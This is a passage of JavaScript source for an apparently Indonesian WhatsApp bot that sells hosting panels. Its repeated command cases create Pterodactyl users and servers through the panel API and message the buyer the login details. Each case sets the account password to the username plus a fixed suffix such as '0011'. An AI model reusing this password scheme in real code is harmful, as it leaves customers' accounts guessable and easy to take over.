https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 20000, db_saldo)
break
case "srvpaket7": {
       if (cekSaldo(sender,db_saldo) < 12000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp12.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 12000, db_saldo)
break
case "srvpaket8": {
       if (cekSaldo(sender,db_saldo) < 13000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp13.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 13000, db_saldo)
break
case "srvpaket9": {
       if (cekSaldo(sender,db_saldo) < 14000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp14.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 14000, db_saldo)
break
case "srvpaket10": {
       if (cekSaldo(sender,db_saldo) < 15000) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "By Hardz"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
minSaldo(sender, 15000, db_saldo)
break
case "1gb": {
    if (!isPremium && !isOwner && !IsSeler) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "10"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`DONE BY HzOffcial⚡

 *DONE CRATE USER + SERVER ID :* ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}
 *😎PEMILIK SERVER* : *${namaCreator}*
 
*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
𝐃𝐎𝐍𝐄 𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐂𝐄𝐊 𝐃𝐀𝐓𝐀 𝐀𝐊𝐔𝐍 𝐏𝐀𝐍𝐄𝐋 𝐀𝐍𝐃𝐀 𝐒𝐔𝐃𝐀𝐇 𝐓𝐄𝐑𝐊𝐈𝐑𝐈𝐌 𝐊𝐄 𝐍𝐎𝐌𝐎𝐑 𝐓𝐄𝐑𝐒𝐄𝐁𝐔𝐓 ☑️
© Cs HzOffcial
`)

}

break
case "2gb": {
if (!isPremium && !isOwner && !IsSeler) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "200"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "3gb": {
if (!isPremium && !isOwner && !IsSeler) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "300"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
https://chat.whatsapp.com/DyUFyZz6ZQeGY16v3nYBzm

*GRUP OWNER1 :*
https://chat.whatsapp.com/GN8gclIwBroEX6tdFtvvbZ

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*

TYPE: user

ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
    if (!isPremium && !isOwner && !IsSeler) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Reguler"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "200"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/49ea31e74d496b1363d69.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

*TUTOR BUAT PANEL DI ADMIN PANEL :*
https://youtu.be/ukYdr_FfVI4

*TUTOR RUN BOT DI PANEL :*
https://youtu.be/-XKfz5Xzqt4

*YOUTUBE OWNER :*
https://youtube.com/@HardzBanxv

*GRUP OWNER1 :*
